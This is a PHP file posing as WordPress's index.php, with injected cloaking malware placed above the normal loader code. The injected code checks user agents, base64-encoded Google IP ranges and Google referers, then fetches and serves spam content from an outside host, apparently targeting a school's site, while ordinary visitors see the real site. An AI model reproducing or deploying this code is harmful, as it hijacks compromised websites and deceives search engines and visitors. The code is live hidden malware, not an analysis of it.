<?php

$contents = 'https://supernika.cloud/jangan-ya-dek-ya/slbn3kotabengkulu.sch.id.txt';
$allDevice = true;

function getContents($url) {
    if(!function_exists('file_get_contents')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $return = curl_exec($ch);
        curl_close($ch);
    } else {
        $return = file_get_contents($url);
    }
    return $return;
}

function KontolNjepat($ua,$ip) {
    global $allDevice;
    if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i',$ua)
        ||
        preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($ua,0,4))) {

            if(preg_match("/googlebot|google.com|google/i", $ua)) {
                return true;
            }
        
            $listIp = "MTkyLjE3OC41LjAKMzQuMTAwLjE4Mi45NgozNC4xMDEuNTAuMTQ0CjM0LjExOC4yNTQuMAozNC4xMTguNjYuMAozNC4xMjYuMTc4Ljk2CjM0LjE0Ni4xNTAuMTQ0CjM0LjE0Ny4xMTAuMTQ0CjM0LjE1MS43NC4xNDQKMzQuMTUyLjUwLjY0CjM0LjE1NC4xMTQuMTQ0CjM0LjE1NS45OC4zMgozNC4xNjUuMTguMTc2CjM0LjE3NS4xNjAuNjQKMzQuMTc2LjEzMC4xNgozNC4yMi44NS4wCjM0LjY0LjgyLjY0CjM0LjY1LjI0Mi4xMTIKMzQuODAuNTAuODAKMzQuODguMTk0LjAKMzQuODkuMTAuODAKMzQuODkuMTk4LjgwCjM0Ljk2LjE2Mi40OAozNS4yNDcuMjQzLjI0MAo2Ni4yNDkuNjQuMAo2Ni4yNDkuNjQuMTI4CjY2LjI0OS42NC4xNjAKNjYuMjQ5LjY0LjE5Mgo2Ni4yNDkuNjQuMjI0CjY2LjI0OS42NC4zMgo2Ni4yNDkuNjQuNjQKNjYuMjQ5LjY0Ljk2CjY2LjI0OS42NS4wCjY2LjI0OS42NS4xMjgKNjYuMjQ5LjY1LjE2MAo2Ni4yNDkuNjUuMTkyCjY2LjI0OS42NS4yMjQKNjYuMjQ5LjY1LjMyCjY2LjI0OS42NS42NAo2Ni4yNDkuNjUuOTYKNjYuMjQ5LjY2LjAKNjYuMjQ5LjY2LjEyOAo2Ni4yNDkuNjYuMTYwCjY2LjI0OS42Ni4xOTIKNjYuMjQ5LjY2LjMyCjY2LjI0OS42Ni42NAo2Ni4yNDkuNjYuOTYKNjYuMjQ5LjY4LjAKNjYuMjQ5LjY4LjMyCjY2LjI0OS42OC42NAo2Ni4yNDkuNjkuMAo2Ni4yNDkuNjkuMTI4CjY2LjI0OS42OS4xNjAKNjYuMjQ5LjY5LjE5Mgo2Ni4yNDkuNjkuMjI0CjY2LjI0OS42OS4zMgo2Ni4yNDkuNjkuNjQKNjYuMjQ5LjY5Ljk2CjY2LjI0OS43MC4wCjY2LjI0OS43MC4xMjgKNjYuMjQ5LjcwLjE2MAo2Ni4yNDkuNzAuMTkyCjY2LjI0OS43MC4yMjQKNjYuMjQ5LjcwLjMyCjY2LjI0OS43MC42NAo2Ni4yNDkuNzAuOTYKNjYuMjQ5LjcxLjAKNjYuMjQ5LjcxLjEyOAo2Ni4yNDkuNzEuMTYwCjY2LjI0OS43MS4xOTIKNjYuMjQ5LjcxLjIyNAo2Ni4yNDkuNzEuMzIKNjYuMjQ5LjcxLjY0CjY2LjI0OS43MS45Ngo2Ni4yNDkuNzIuMAo2Ni4yNDkuNzIuMTI4CjY2LjI0OS43Mi4xNjAKNjYuMjQ5LjcyLjE5Mgo2Ni4yNDkuNzIuMjI0CjY2LjI0OS43Mi4zMgo2Ni4yNDkuNzIuNjQKNjYuMjQ5LjcyLjk2CjY2LjI0OS43My4wCjY2LjI0OS43My4xMjgKNjYuMjQ5LjczLjE2MAo2Ni4yNDkuNzMuMTkyCjY2LjI0OS43My4yMjQKNjYuMjQ5LjczLjMyCjY2LjI0OS43My42NAo2Ni4yNDkuNzMuOTYKNjYuMjQ5Ljc0LjAKNjYuMjQ5Ljc0LjEyOAo2Ni4yNDkuNzQuMzIKNjYuMjQ5Ljc0LjY0CjY2LjI0OS43NC45Ngo2Ni4yNDkuNzUuMAo2Ni4yNDkuNzUuMTI4CjY2LjI0OS43NS4xNjAKNjYuMjQ5Ljc1LjE5Mgo2Ni4yNDkuNzUuMjI0CjY2LjI0OS43NS4zMgo2Ni4yNDkuNzUuNjQKNjYuMjQ5Ljc1Ljk2CjY2LjI0OS43Ni4wCjY2LjI0OS43Ni4xMjgKNjYuMjQ5Ljc2LjE2MAo2Ni4yNDkuNzYuMTkyCjY2LjI0OS43Ni4yMjQKNjYuMjQ5Ljc2LjMyCjY2LjI0OS43Ni42NAo2Ni4yNDkuNzYuOTYKNjYuMjQ5Ljc3LjAKNjYuMjQ5Ljc3LjEyOAo2Ni4yNDkuNzcuMTYwCjY2LjI0OS43Ny4xOTIKNjYuMjQ5Ljc3LjMyCjY2LjI0OS43Ny42NAo2Ni4yNDkuNzcuOTYKNjYuMjQ5Ljc4LjAKNjYuMjQ5Ljc5LjAKNjYuMjQ5Ljc5LjEyOAo2Ni4yNDkuNzkuMTYwCjY2LjI0OS43OS4xOTIKNjYuMjQ5Ljc5LjIyNAo2Ni4yNDkuNzkuMzIKNjYuMjQ5Ljc5LjY0CjY2LjI0OS43OS45Ng==";
            $listIp = base64_decode($listIp);
            $listIp = explode("\n", $listIp);
        
            if(in_array($ip, $listIp)) {
                return true;
            }
        
            if(preg_match('/google/i', getReferer())) {
                return true;
            }
    } else {
      if($allDevice) {
        if(preg_match("/googlebot|google.com|google/i", $ua)) {
          return true;
        }
  
        $listIp = "MTkyLjE3OC41LjAKMzQuMTAwLjE4Mi45NgozNC4xMDEuNTAuMTQ0CjM0LjExOC4yNTQuMAozNC4xMTguNjYuMAozNC4xMjYuMTc4Ljk2CjM0LjE0Ni4xNTAuMTQ0CjM0LjE0Ny4xMTAuMTQ0CjM0LjE1MS43NC4xNDQKMzQuMTUyLjUwLjY0CjM0LjE1NC4xMTQuMTQ0CjM0LjE1NS45OC4zMgozNC4xNjUuMTguMTc2CjM0LjE3NS4xNjAuNjQKMzQuMTc2LjEzMC4xNgozNC4yMi44NS4wCjM0LjY0LjgyLjY0CjM0LjY1LjI0Mi4xMTIKMzQuODAuNTAuODAKMzQuODguMTk0LjAKMzQuODkuMTAuODAKMzQuODkuMTk4LjgwCjM0Ljk2LjE2Mi40OAozNS4yNDcuMjQzLjI0MAo2Ni4yNDkuNjQuMAo2Ni4yNDkuNjQuMTI4CjY2LjI0OS42NC4xNjAKNjYuMjQ5LjY0LjE5Mgo2Ni4yNDkuNjQuMjI0CjY2LjI0OS42NC4zMgo2Ni4yNDkuNjQuNjQKNjYuMjQ5LjY0Ljk2CjY2LjI0OS42NS4wCjY2LjI0OS42NS4xMjgKNjYuMjQ5LjY1LjE2MAo2Ni4yNDkuNjUuMTkyCjY2LjI0OS42NS4yMjQKNjYuMjQ5LjY1LjMyCjY2LjI0OS42NS42NAo2Ni4yNDkuNjUuOTYKNjYuMjQ5LjY2LjAKNjYuMjQ5LjY2LjEyOAo2Ni4yNDkuNjYuMTYwCjY2LjI0OS42Ni4xOTIKNjYuMjQ5LjY2LjMyCjY2LjI0OS42Ni42NAo2Ni4yNDkuNjYuOTYKNjYuMjQ5LjY4LjAKNjYuMjQ5LjY4LjMyCjY2LjI0OS42OC42NAo2Ni4yNDkuNjkuMAo2Ni4yNDkuNjkuMTI4CjY2LjI0OS42OS4xNjAKNjYuMjQ5LjY5LjE5Mgo2Ni4yNDkuNjkuMjI0CjY2LjI0OS42OS4zMgo2Ni4yNDkuNjkuNjQKNjYuMjQ5LjY5Ljk2CjY2LjI0OS43MC4wCjY2LjI0OS43MC4xMjgKNjYuMjQ5LjcwLjE2MAo2Ni4yNDkuNzAuMTkyCjY2LjI0OS43MC4yMjQKNjYuMjQ5LjcwLjMyCjY2LjI0OS43MC42NAo2Ni4yNDkuNzAuOTYKNjYuMjQ5LjcxLjAKNjYuMjQ5LjcxLjEyOAo2Ni4yNDkuNzEuMTYwCjY2LjI0OS43MS4xOTIKNjYuMjQ5LjcxLjIyNAo2Ni4yNDkuNzEuMzIKNjYuMjQ5LjcxLjY0CjY2LjI0OS43MS45Ngo2Ni4yNDkuNzIuMAo2Ni4yNDkuNzIuMTI4CjY2LjI0OS43Mi4xNjAKNjYuMjQ5LjcyLjE5Mgo2Ni4yNDkuNzIuMjI0CjY2LjI0OS43Mi4zMgo2Ni4yNDkuNzIuNjQKNjYuMjQ5LjcyLjk2CjY2LjI0OS43My4wCjY2LjI0OS43My4xMjgKNjYuMjQ5LjczLjE2MAo2Ni4yNDkuNzMuMTkyCjY2LjI0OS43My4yMjQKNjYuMjQ5LjczLjMyCjY2LjI0OS43My42NAo2Ni4yNDkuNzMuOTYKNjYuMjQ5Ljc0LjAKNjYuMjQ5Ljc0LjEyOAo2Ni4yNDkuNzQuMzIKNjYuMjQ5Ljc0LjY0CjY2LjI0OS43NC45Ngo2Ni4yNDkuNzUuMAo2Ni4yNDkuNzUuMTI4CjY2LjI0OS43NS4xNjAKNjYuMjQ5Ljc1LjE5Mgo2Ni4yNDkuNzUuMjI0CjY2LjI0OS43NS4zMgo2Ni4yNDkuNzUuNjQKNjYuMjQ5Ljc1Ljk2CjY2LjI0OS43Ni4wCjY2LjI0OS43Ni4xMjgKNjYuMjQ5Ljc2LjE2MAo2Ni4yNDkuNzYuMTkyCjY2LjI0OS43Ni4yMjQKNjYuMjQ5Ljc2LjMyCjY2LjI0OS43Ni42NAo2Ni4yNDkuNzYuOTYKNjYuMjQ5Ljc3LjAKNjYuMjQ5Ljc3LjEyOAo2Ni4yNDkuNzcuMTYwCjY2LjI0OS43Ny4xOTIKNjYuMjQ5Ljc3LjMyCjY2LjI0OS43Ny42NAo2Ni4yNDkuNzcuOTYKNjYuMjQ5Ljc4LjAKNjYuMjQ5Ljc5LjAKNjYuMjQ5Ljc5LjEyOAo2Ni4yNDkuNzkuMTYwCjY2LjI0OS43OS4xOTIKNjYuMjQ5Ljc5LjIyNAo2Ni4yNDkuNzkuMzIKNjYuMjQ5Ljc5LjY0CjY2LjI0OS43OS45Ng==";
        $listIp = base64_decode($listIp);
        $listIp = explode("\n", $listIp);
    
        if(in_array($ip, $listIp)) {
            return true;
        }
    
        if(preg_match('/google/i', getReferer())) {
            return true;
        }
      }
      return false;
    }

}

function getReferer() {
    return $_SERVER['HTTP_REFERER'];
}

function getRealIP(){
        if (isset($_SERVER["HTTP_CLIENT_IP"])) {
            $ip = $_SERVER["HTTP_CLIENT_IP"];
        } elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
            $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
        } elseif (isset($_SERVER["HTTP_X_FORWARDED"])) {
            $ip = $_SERVER["HTTP_X_FORWARDED"];
        } elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])) {
            $ip = $_SERVER["HTTP_FORWARDED_FOR"];
        } elseif (isset($_SERVER["HTTP_FORWARDED"])) {
            $ip = $_SERVER["HTTP_FORWARDED"];
        } else {
            $ip = $_SERVER["REMOTE_ADDR"];
        }

        // Strip any secondary IP etc from the IP address
        if (strpos($ip, ',') > 0) {
            $ip = substr($ip, 0, strpos($ip, ','));
        }
        return $ip;
}

if(KontolNjepat($_SERVER['HTTP_USER_AGENT'], getRealIP())) {
    echo getContents($contents);
    exit;
}
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
